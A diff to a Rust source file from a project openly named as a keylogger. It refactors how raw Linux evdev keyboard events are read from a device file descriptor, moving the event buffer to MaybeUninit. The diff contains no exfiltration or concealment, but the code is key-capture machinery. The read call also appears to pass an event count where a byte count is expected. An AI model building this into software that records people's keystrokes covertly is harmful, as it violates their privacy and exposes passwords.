@@ -3,6 +3,7 @@ use crate::keylogger::KeyloggerResult;
 use std::convert::TryFrom;
 use std::fs::{self, File};
 use std::io;
+use std::mem;
 use std::os::fd::{AsRawFd, RawFd};
 use std::os::unix::fs::FileTypeExt;
 use std::path::PathBuf;
@@ -18,29 +19,29 @@ const IOC_READ: libc::c_ulong = 2;
 
 /// Read [`libc::input_event`s](libc::input_event) from the specified file descriptor.
 pub(crate) fn read_key_events(fd: RawFd) -> io::Result<Vec<KeyEvent>> {
+    Ok(read_input_events(fd)?
+        .iter()
+        .filter_map(|e| KeyEvent::try_from(e).ok())
+        .collect())
+}
+
+fn read_input_events(fd: impl Into<RawFd>) -> io::Result<Vec<libc::input_event>> {
     const MAX_INPUT_EV: usize = 128;
 
-    let default_event = libc::input_event {
-        time: libc::timeval {
-            tv_sec: 0,
-            tv_usec: 0,
-        },
-        type_: 0,
-        code: 0,
-        value: 0,
-    };
-    let mut input_events = [default_event; MAX_INPUT_EV];
+    let mut input_events = [mem::MaybeUninit::<libc::input_event>::uninit(); MAX_INPUT_EV];
 
-    let n = unsafe { libc::read(fd, input_events.as_mut_ptr() as *mut _, MAX_INPUT_EV) };
+    let n = unsafe { libc::read(fd.into(), input_events.as_mut_ptr() as *mut _, MAX_INPUT_EV) };
 
     if n < 0 {
         return Err(io::Error::last_os_error());
     }
 
-    let n = (n as usize) / std::mem::size_of::<libc::input_event>();
+    let n = (n as usize) / mem::size_of::<libc::input_event>();
+
+    // The first n elements of the array are initialized:
     Ok(input_events[..n]
         .iter()
-        .filter_map(|e| KeyEvent::try_from(e).ok())
+        .map(|e| unsafe { e.assume_init() })
         .collect())
 }
 
@@ -87,7 +88,7 @@ pub(crate) fn read_event_flags(f: &File) -> KeyloggerResult<libc::c_ulong> {
     let eviocgbit = (IOC_READ << IOC_DIRSHIFT)
         | (('E' as libc::c_ulong) << IOC_TYPESHIFT)
         | (0x20 << IOC_NRSHIFT)
-        | (((std::mem::size_of::<libc::c_ulong>()) as libc::c_ulong) << IOC_SIZESHIFT);
+        | (((mem::size_of::<libc::c_ulong>()) as libc::c_ulong) << IOC_SIZESHIFT);
 
     ioctl(
         f.as_raw_fd(),
